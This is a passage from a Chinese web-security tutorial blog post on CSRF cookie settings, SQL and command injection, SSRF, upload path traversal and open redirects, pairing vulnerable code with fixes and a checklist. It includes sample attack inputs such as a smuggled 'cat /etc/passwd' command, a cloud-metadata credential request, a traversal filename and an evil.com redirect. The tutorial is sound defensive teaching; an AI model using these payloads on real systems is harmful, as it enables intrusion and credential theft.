+<p>⚠️ <strong><code>SameSite=Lax</code> 挡不住顶级导航的 GET 请求</strong>。如果有个 <code>GET /orders/&#123;id&#125;/cancel</code> 这样的接口，Lax 完全无效。<strong>改状态的接口绝不能用 GET。</strong></p>
+</blockquote>
+<p>Cookie 前缀是最省事的一道保险：</p>
+<table>
+<thead>
+<tr>
+<th>前缀</th>
+<th>强制要求</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>__Secure-</code></td>
+<td>必须带 <code>Secure</code></td>
+</tr>
+<tr>
+<td><code>__Host-</code></td>
+<td>必须带 <code>Secure</code>，<code>Path=/</code>，<strong>且不能有 <code>Domain</code></strong></td>
+</tr>
+</tbody></table>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-attribute">Set-Cookie</span><span class="hljs-punctuation">: </span>__Host-session=abc; Secure; HttpOnly; SameSite=Lax; Path=/<br></code></pre></td></tr></table></figure>
+
+<blockquote>
+<p>⚠️ <code>__Host-</code> 前缀能阻止<strong>子域名</strong>覆盖主域的 Cookie（子域被入侵是常见场景）。<strong>会话 Cookie 一律用 <code>__Host-</code>。</strong></p>
+</blockquote>
+<blockquote>
+<p>⚠️ CSRF Token 必须<strong>和会话绑定</strong>且<strong>每次请求校验</strong>。常见错误：Token 全局唯一（所有人一样）、只在登录时校验、把 Token 放在 Cookie 里又用 Cookie 里的值比对（那叫 Double Submit，需要额外约束才安全）。</p>
+</blockquote>
+<blockquote>
+<p>⚠️ <strong>CORS 不是 CSRF 防御</strong>。CORS 限制的是「读取响应」，不限制「发出请求」。<code>POST</code> 请求照样发出去并生效，只是攻击者读不到结果。</p>
+</blockquote>
+<h2 id="五、SQL-注入"><a href="#五、SQL-注入" class="headerlink" title="五、SQL 注入"></a>五、SQL 注入</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># ❌ 字符串拼接</span><br>cursor.execute(<span class="hljs-string">f&quot;SELECT * FROM users WHERE email = &#x27;<span class="hljs-subst">&#123;email&#125;</span>&#x27;&quot;</span>)<br><span class="hljs-comment"># email = &quot;&#x27; OR &#x27;1&#x27;=&#x27;1&quot; → 返回所有用户</span><br></code></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># ✅ 参数化查询</span><br>cursor.execute(<span class="hljs-string">&quot;SELECT * FROM users WHERE email = %s&quot;</span>, (email,))<br></code></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th>做法</th>
+<th>是否安全</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>参数化 &#x2F; 预编译语句</td>
+<td>✅</td>
+</tr>
+<tr>
+<td>存储过程（内部仍拼字符串）</td>
+<td>❌</td>
+</tr>
+<tr>
+<td>ORM 的 <code>.raw()</code> &#x2F; <code>text()</code> 拼字符串</td>
+<td>❌</td>
+</tr>
+<tr>
+<td>ORM 的正常链式查询</td>
+<td>✅（内部已参数化）</td>
+</tr>
+<tr>
+<td>自己写的转义函数</td>
+<td>❌</td>
+</tr>
+<tr>
+<td>黑名单过滤引号</td>
+<td>❌（编码、注释、多字节绕过）</td>
+</tr>
+</tbody></table>
+<blockquote>
+<p>⚠️ <strong>标识符（表名、列名、<code>ORDER BY</code> 字段、<code>ASC/DESC</code>）无法参数化</strong>。这些位置<strong>只能白名单</strong>：</p>
+</blockquote>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python">ALLOWED_SORT = &#123;<span class="hljs-string">&quot;created_at&quot;</span>, <span class="hljs-string">&quot;name&quot;</span>, <span class="hljs-string">&quot;id&quot;</span>&#125;<br>ALLOWED_DIR  = &#123;<span class="hljs-string">&quot;asc&quot;</span>, <span class="hljs-string">&quot;desc&quot;</span>&#125;<br><br>sort = sort <span class="hljs-keyword">if</span> sort <span class="hljs-keyword">in</span> ALLOWED_SORT <span class="hljs-keyword">else</span> <span class="hljs-string">&quot;created_at&quot;</span><br>direction = direction <span class="hljs-keyword">if</span> direction <span class="hljs-keyword">in</span> ALLOWED_DIR <span class="hljs-keyword">else</span> <span class="hljs-string">&quot;desc&quot;</span><br><br>cursor.execute(<span class="hljs-string">f&quot;SELECT * FROM users ORDER BY <span class="hljs-subst">&#123;sort&#125;</span> <span class="hljs-subst">&#123;direction&#125;</span> LIMIT %s&quot;</span>, (limit,))<br></code></pre></td></tr></table></figure>
+
+<blockquote>
+<p>⚠️ <strong><code>IN (...)</code> 子句</strong>不能写成 <code>IN (%s)</code> 然后传列表 —— 需要按长度生成对应数量的占位符，或用数据库的数组支持。很多 ORM 有专用方法。</p>
+</blockquote>
+<blockquote>
+<p>⚠️ <strong>ORM 不等于安全</strong>。<code>ORDER BY</code> 拼接、<code>RawSQL</code>、<code>extra()</code>、<code>filter(**user_dict)</code> 展开都可能引入注入。<strong>用户可控的字段名永远走白名单。</strong></p>
+</blockquote>
+<blockquote>
+<p>⚠️ 数据库账号<strong>最小权限</strong>：只给业务表的 <code>SELECT/INSERT/UPDATE/DELETE</code>，不要 <code>DROP</code>、不要 <code>FILE</code>、不要跨库权限。这样即使被注入，损失面也小得多。</p>
+</blockquote>
+<h2 id="六、命令注入"><a href="#六、命令注入" class="headerlink" title="六、命令注入"></a>六、命令注入</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># ❌ shell=True + 拼接</span><br>os.system(<span class="hljs-string">f&quot;convert <span class="hljs-subst">&#123;filename&#125;</span> out.png&quot;</span>)<br>subprocess.run(<span class="hljs-string">f&quot;ping -c 1 <span class="hljs-subst">&#123;host&#125;</span>&quot;</span>, shell=<span class="hljs-literal">True</span>)<br><span class="hljs-comment"># host = &quot;8.8.8.8; cat /etc/passwd&quot;</span><br></code></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># ✅ 参数数组，不经过 shell</span><br>subprocess.run([<span class="hljs-string">&quot;ping&quot;</span>, <span class="hljs-string">&quot;-c&quot;</span>, <span class="hljs-string">&quot;1&quot;</span>, host], shell=<span class="hljs-literal">False</span>, check=<span class="hljs-literal">True</span>)<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">// ❌</span><br><span class="hljs-title function_">exec</span>(<span class="hljs-string">`git clone <span class="hljs-subst">$&#123;repoUrl&#125;</span>`</span>);<br><br><span class="hljs-comment">// ✅ 数组参数</span><br><span class="hljs-title function_">execFile</span>(<span class="hljs-string">&#x27;git&#x27;</span>, [<span class="hljs-string">&#x27;clone&#x27;</span>, repoUrl]);<br></code></pre></td></tr></table></figure>
+
+<blockquote>
+<p>⚠️ <strong>参数数组也不是万能的</strong>：如果目标程序自己会解释参数（比如 <code>sh -c</code>、<code>curl</code> 的 <code>-o</code>、<code>git</code> 的 <code>--upload-pack</code>、<code>tar</code> 的 <code>--to-command</code>），参数里仍能塞命令。<strong>还要校验参数值本身</strong>（比如 <code>host</code> 必须匹配 IP&#x2F;域名正则）。</p>
+</blockquote>
+<blockquote>
+<p>⚠️ <code>shell=False</code> 只是不经过 shell，<strong>不代表参数安全</strong>。别用 <code>sh -c</code> 包一层再传用户输入。</p>
+</blockquote>
+<h2 id="七、SSRF"><a href="#七、SSRF" class="headerlink" title="七、SSRF"></a>七、SSRF</h2><p>服务端被诱导去请求攻击者指定的地址，用来<strong>探测内网</strong>或读取<strong>云元数据</strong>。</p>
+<figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs dts">POST <span class="hljs-keyword">/api/</span><span class="hljs-title class_">fetch</span><br><span class="hljs-punctuation">&#123;</span><span class="hljs-string">&quot;url&quot;</span>: <span class="hljs-string">&quot;http://169.254.169.254/latest/meta-data/iam/security-credentials/&quot;</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th>目标</th>
+<th>危害</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>127.0.0.1</code> &#x2F; <code>localhost</code></td>
+<td>访问本机管理接口</td>
+</tr>
+<tr>
+<td><code>169.254.169.254</code></td>
+<td><strong>云厂商元数据服务</strong>，可能拿到临时凭据</td>
+</tr>
+<tr>
+<td><code>10.0.0.0/8</code>、<code>172.16.0.0/12</code>、<code>192.168.0.0/16</code></td>
+<td>内网服务</td>
+</tr>
+<tr>
+<td><code>[::1]</code>、<code>0.0.0.0</code></td>
+<td>IPv6 &#x2F; 通配</td>
+</tr>
+<tr>
+<td>十进制 &#x2F; 八进制 IP（<code>2130706433</code>）</td>
+<td>绕过字符串黑名单</td>
+</tr>
+</tbody></table>
+<p>防御：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 1. 域名白名单（最可靠）</span><br>ALLOWED_HOSTS = &#123;<span class="hljs-string">&quot;api.partner.com&quot;</span>, <span class="hljs-string">&quot;cdn.example.com&quot;</span>&#125;<br><span class="hljs-keyword">if</span> urlparse(url).hostname <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> ALLOWED_HOSTS:<br>    <span class="hljs-keyword">raise</span> Forbidden()<br><br><span class="hljs-comment"># 2. 解析后校验 IP（防 DNS rebinding 要解析后再校验，且用解析结果连接）</span><br>ip = ipaddress.ip_address(socket.gethostbyname(host))<br><span class="hljs-keyword">if</span> ip.is_private <span class="hljs-keyword">or</span> ip.is_loopback <span class="hljs-keyword">or</span> ip.is_link_local <span class="hljs-keyword">or</span> ip.is_reserved:<br>    <span class="hljs-keyword">raise</span> Forbidden()<br><br><span class="hljs-comment"># 3. 禁止重定向跟随</span><br>allow_redirects=<span class="hljs-literal">False</span><br><br><span class="hljs-comment"># 4. 禁止非 http/https 协议（防 file://、gopher://、dict://）</span><br><span class="hljs-keyword">if</span> scheme <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> (<span class="hljs-string">&quot;http&quot;</span>, <span class="hljs-string">&quot;https&quot;</span>):<br>    <span class="hljs-keyword">raise</span> Forbidden()<br></code></pre></td></tr></table></figure>
+
+<blockquote>
+<p>⚠️ <strong>必须先解析域名再校验 IP，然后用同一个 IP 去连接</strong>。先校验域名再让 HTTP 客户端自己解析，会留下 <strong>DNS rebinding</strong> 窗口 —— 攻击者让第一次解析返回公网 IP，第二次返回 <code>127.0.0.1</code>。</p>
+</blockquote>
+<blockquote>
+<p>⚠️ <strong>要禁掉重定向跟随</strong>。<code>allow_redirects=True</code> 时，攻击者可以用一个公网 URL 返回 <code>302 → http://169.254.169.254</code>，绕过所有前置校验。</p>
+</blockquote>
+<blockquote>
+<p>⚠️ <strong>云上务必关闭实例元数据的无认证访问</strong>（各云厂商都有 IMDSv2 之类的开关），这是最后一道保险。</p>
+</blockquote>
+<blockquote>
+<p>⚠️ 出站流量走<strong>独立网段 + 防火墙白名单</strong>，比在应用层做校验更可靠。</p>
+</blockquote>
+<h2 id="八、文件上传与路径穿越"><a href="#八、文件上传与路径穿越" class="headerlink" title="八、文件上传与路径穿越"></a>八、文件上传与路径穿越</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># ❌ 直接用用户提供的文件名</span><br>path = os.path.join(UPLOAD_DIR, file.filename)<br><span class="hljs-comment"># filename = &quot;../../../../etc/cron.d/evil&quot;</span><br></code></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># ✅ 只取扩展名 + 生成随机名 + 规范化后校验前缀</span><br><span class="hljs-keyword">import</span> uuid, os<br>ext = os.path.splitext(file.filename)[<span class="hljs-number">1</span>].lower()<br><span class="hljs-keyword">if</span> ext <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> &#123;<span class="hljs-string">&quot;.png&quot;</span>, <span class="hljs-string">&quot;.jpg&quot;</span>, <span class="hljs-string">&quot;.jpeg&quot;</span>, <span class="hljs-string">&quot;.webp&quot;</span>&#125;:<br>    <span class="hljs-keyword">raise</span> BadRequest()<br>name = <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;uuid.uuid4().<span class="hljs-built_in">hex</span>&#125;</span><span class="hljs-subst">&#123;ext&#125;</span>&quot;</span><br>path = os.path.realpath(os.path.join(UPLOAD_DIR, name))<br><span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> path.startswith(os.path.realpath(UPLOAD_DIR) + os.sep):<br>    <span class="hljs-keyword">raise</span> BadRequest()<br></code></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th>校验项</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>扩展名白名单</td>
+<td>只允许明确需要的类型</td>
+</tr>
+<tr>
+<td>MIME 类型</td>
+<td><code>Content-Type</code> <strong>客户端可伪造</strong>，只能作辅助</td>
+</tr>
+<tr>
+<td><strong>文件头魔数</strong></td>
+<td>读前几字节校验真实类型，这才是可靠的</td>
+</tr>
+<tr>
+<td>大小上限</td>
+<td>防磁盘打满</td>
+</tr>
+<tr>
+<td>随机文件名</td>
+<td>避免覆盖、避免穿越、避免猜路径</td>
+</tr>
+<tr>
+<td>存储目录在 webroot <strong>之外</strong></td>
+<td>上传的文件绝不能被当脚本执行</td>
+</tr>
+<tr>
+<td>图片重新编码</td>
+<td>彻底洗掉嵌入的恶意内容</td>
+</tr>
+</tbody></table>
+<blockquote>
+<p>⚠️ <strong>上传目录绝不能允许脚本执行</strong>。<code>.php</code>、<code>.jsp</code>、<code>.asp</code> 上传成功后直接访问就是 RCE。Nginx 里对上传目录加 <code>location ^~ /uploads/ &#123; location ~ \.(php|jsp|asp)$ &#123; deny all; &#125; &#125;</code>，或者干脆把上传目录放到 webroot 外，通过应用层代理读取。</p>
+</blockquote>
+<blockquote>
+<p>⚠️ <strong><code>os.path.join</code> 有个陷阱</strong>：如果第二个参数是绝对路径（<code>/etc/passwd</code>），它会<strong>丢弃第一个参数</strong>直接返回第二个。所以 <code>os.path.join(SAFE_DIR, &quot;/etc/passwd&quot;)</code> &#x3D;&#x3D; <code>/etc/passwd</code>。必须显式剥离前导 <code>/</code>。</p>
+</blockquote>
+<blockquote>
+<p>⚠️ 路径穿越不止 <code>../</code>，还有 URL 编码（<code>%2e%2e%2f</code>）、双重编码（<code>%252e%252e%252f</code>）、<code>..\</code>、绝对路径、软链接。<strong>只靠字符串替换 <code>../</code> 一定被绕过</strong> —— 正确做法是「规范化 + 前缀校验」。</p>
+</blockquote>
+<h2 id="九、开放重定向"><a href="#九、开放重定向" class="headerlink" title="九、开放重定向"></a>九、开放重定向</h2><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/login?next=https://evil.com/phish</span> <span class="hljs-meta">HTTP/1.1</span><br></code></pre></td></tr></table></figure>
+
+<p>用户看到的是你自己域名的链接，点进去被跳到钓鱼站 —— <strong>钓鱼页面上的地址栏显示的是你的域名</strong>（至少是跳转前）。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># ✅ 只允许站内相对路径</span><br><span class="hljs-keyword">from</span> urllib.parse <span class="hljs-keyword">import</span> urlparse<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">safe_next</span>(<span class="hljs-params">target: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-built_in">str</span>:<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> target:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;/&quot;</span><br>    p = urlparse(target)<br>    <span class="hljs-keyword">if</span> p.scheme <span class="hljs-keyword">or</span> p.netloc:        <span class="hljs-comment"># 带 scheme 或 host 一律拒绝</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;/&quot;</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> target.startswith(<span class="hljs-string">&quot;/&quot;</span>) <span class="hljs-keyword">or</span> target.startswith(<span class="hljs-string">&quot;//&quot;</span>):<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;/&quot;</span>                  <span class="hljs-comment"># 防 //evil.com 协议相对 URL</span><br>    <span class="hljs-keyword">return</span> target<br></code></pre></td></tr></table></figure>
+
+<blockquote>
+<p>⚠️ <strong><code>//evil.com</code> 是协议相对 URL</strong>，浏览器会补成 <code>https://evil.com</code>。只判断 <code>startswith(&#39;http&#39;)</code> 会漏掉它。</p>
+</blockquote>
+<blockquote>
+<p>⚠️ 如果确实需要跳外站，<strong>用白名单</strong>，不要用黑名单（<code>evil.com</code> 有无数种写法：<code>evil.com@trusted.com</code>、<code>trusted.com.evil.com</code>、大小写、Unicode 同形字）。</p>
+</blockquote>
+<blockquote>
+<p>⚠️ 同样的坑出现在 <strong>OAuth 的 <code>redirect_uri</code></strong> 上：必须<strong>精确匹配</strong>注册过的回调地址，不能做前缀匹配（<code>https://app.com.evil.com</code> 会通过前缀匹配）。</p>
+</blockquote>
+<h2 id="常见坑清单"><a href="#常见坑清单" class="headerlink" title="常见坑清单"></a>常见坑清单</h2><ul>
+<li><input disabled="" type="checkbox"> 用 <code>innerHTML</code> &#x2F; <code>v-html</code> &#x2F; <code>dangerouslySetInnerHTML</code> 渲染用户数据</li>
+<li><input disabled="" type="checkbox"> 只在服务端过滤，忽略了 DOM 型 XSS（数据从没经过服务端）</li>
+<li><input disabled="" type="checkbox"> 用同一套转义规则处理 HTML 文本和 HTML 属性</li>
+<li><input disabled="" type="checkbox"> 事件属性（<code>onclick=&quot;f(&#39;...&#39;)&quot;</code>）里只做 HTML 转义</li>
+<li><input disabled="" type="checkbox"> 没有校验 URL 协议，<code>javascript:</code> 伪协议可执行</li>
+<li><input disabled="" type="checkbox"> 富文本只在前端消毒，服务端不消毒</li>
+<li><input disabled="" type="checkbox"> CSP 里写了 <code>&#39;unsafe-inline&#39;</code>，或和 nonce 同时写</li>
+<li><input disabled="" type="checkbox"> CSP 没配 <code>object-src</code> &#x2F; <code>base-uri</code> &#x2F; <code>frame-ancestors</code></li>
+<li><input disabled="" type="checkbox"> 上线前没跑 <code>Content-Security-Policy-Report-Only</code> 就上强制模式</li>
+<li><input disabled="" type="checkbox"> Cookie 不写 <code>SameSite</code>，依赖浏览器默认值</li>
+<li><input disabled="" type="checkbox"> 会话 Cookie 没用 <code>__Host-</code> 前缀，可被子域覆盖</li>
+<li><input disabled="" type="checkbox"> 用 <code>GET</code> 做状态变更，绕过 <code>SameSite=Lax</code></li>
+<li><input disabled="" type="checkbox"> 把 CORS 配置当成 CSRF 防御</li>
+<li><input disabled="" type="checkbox"> CSRF Token 全局唯一，或只在登录时校验</li>
+<li><input disabled="" type="checkbox"> 用字符串拼接构造 SQL</li>
+<li><input disabled="" type="checkbox"> <code>ORDER BY</code> &#x2F; 表名 &#x2F; 列名直接拼接，不走白名单</li>
+<li><input disabled="" type="checkbox"> 以为用了 ORM 就绝对没有 SQL 注入</li>
+<li><input disabled="" type="checkbox"> 数据库账号权限过大（<code>DROP</code>、跨库、<code>FILE</code>）</li>
+<li><input disabled="" type="checkbox"> 用 <code>shell=True</code> &#x2F; <code>exec()</code> 拼接命令</li>
+<li><input disabled="" type="checkbox"> <code>shell=False</code> 就直接信任参数值，没校验内容</li>
+<li><input disabled="" type="checkbox"> SSRF 只做域名黑名单，没做 IP 段校验</li>
+<li><input disabled="" type="checkbox"> 校验域名后让客户端自己解析，留下 DNS rebinding 窗口</li>
+<li><input disabled="" type="checkbox"> SSRF 请求跟随重定向，绕过前置校验</li>
+<li><input disabled="" type="checkbox"> 云实例元数据未启用认证保护</li>
+<li><input disabled="" type="checkbox"> 上传文件用原始文件名，或用了 <code>os.path.join</code> 却传入绝对路径</li>
+<li><input disabled="" type="checkbox"> 上传目录可执行脚本</li>
+<li><input disabled="" type="checkbox"> 只靠字符串替换 <code>../</code> 防路径穿越，不做规范化 + 前缀校验</li>
+<li><input disabled="" type="checkbox"> 重定向的 <code>next</code> 参数不校验，且漏掉 <code>//evil.com</code></li>
+<li><input disabled="" type="checkbox"> OAuth <code>redirect_uri</code> 用前缀匹配而不是精确匹配</li>
+</ul>
+<h2 id="参考来源"><a href="#参考来源" class="headerlink" title="参考来源"></a>参考来源</h2><p><a target="_blank" rel="noopener" href="https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html">OWASP · XSS 预防速查表</a> · <a target="_blank" rel="noopener" href="https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html">OWASP · CSRF 预防速查表</a> · <a target="_blank" rel="noopener" href="https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html">OWASP · SQL 注入预防速查表</a> · <a target="_blank" rel="noopener" href="https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html">OWASP · SSRF 预防速查表</a> · <a target="_blank" rel="noopener" href="https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html">OWASP · 文件上传速查表</a> · <a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Reference/Headers/Content-Security-Policy">MDN · Content-Security-Policy</a> · <a target="_blank" rel="noopener" href="https://developer.mozilla.org/en-US/docs/Web/Security/Practical_implementation_guides/Cookies">MDN · 安全 Cookie 配置</a> · <a target="_blank" rel="noopener" href="https://www.w3.org/TR/trusted-types/">W3C · Trusted Types</a> · <a target="_blank" rel="noopener" href="https://datatracker.ietf.org/doc/draft-ietf-httpbis-rfc6265bis/">RFC 6265bis · Cookies</a></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/security/" class="category-chain-item">security</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/security/" class="print-no-link">#security</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>每日技术博客 044 · Web 安全（一）：XSS、CSRF 与注入</div>
+      <div>https://ethan-iopasd.github.io/2026/09/30/每日技术博客044-Web安全XSS与CSRF/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>iopasd</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2026年9月30日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2026/09/30/%E6%AF%8F%E6%97%A5%E6%8A%80%E6%9C%AF%E5%8D%9A%E5%AE%A2045-Web%E5%AE%89%E5%85%A8%E8%AE%A4%E8%AF%81%E4%B8%8E%E6%8E%88%E6%9D%83/" title="每日技术博客 045 · Web 安全（二）：认证、授权与密钥管理">
+                        <span class="hidden-mobile">每日技术博客 045 · Web 安全（二）：认证、授权与密钥管理</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+  <div id="valine"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#valine', function() {
+      Fluid.utils.createScript('https://lib.baomitu.com/valine/1.5.1/Valine.min.js', function() {
+        var options = Object.assign(
+          {"appId":"EVTXF0hnKpdU2Ilq9WAik3gi-gzGzoHsz","appKey":"78W0B9slNa1d9CX7qsxSGTiy","path":"window.location.pathname","placeholder":"请在这里留言","avatar":"retro","meta":["nick","mail","link"],"requiredFields":[],"pageSize":10,"lang":"zh-CN","highlight":false,"recordIP":false,"serverURLs":"","emojiCDN":null,"emojiMaps":null,"enableQQ":false},
+          {
+            el: "#valine",
+            path: window.location.pathname
+          }
+        )
+        new Valine(options);
+        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
+          var imgSelector = '#valine .vcontent img:not(.vemoji)';
+          Fluid.plugins.imageCaption(imgSelector);
+          Fluid.plugins.fancyBox(imgSelector);
+        })
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/Ethan-iopasd/Ethan-iopasd.github.io" target="_blank" rel="nofollow noopener"><span>Ethan-iopasd</span></a> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
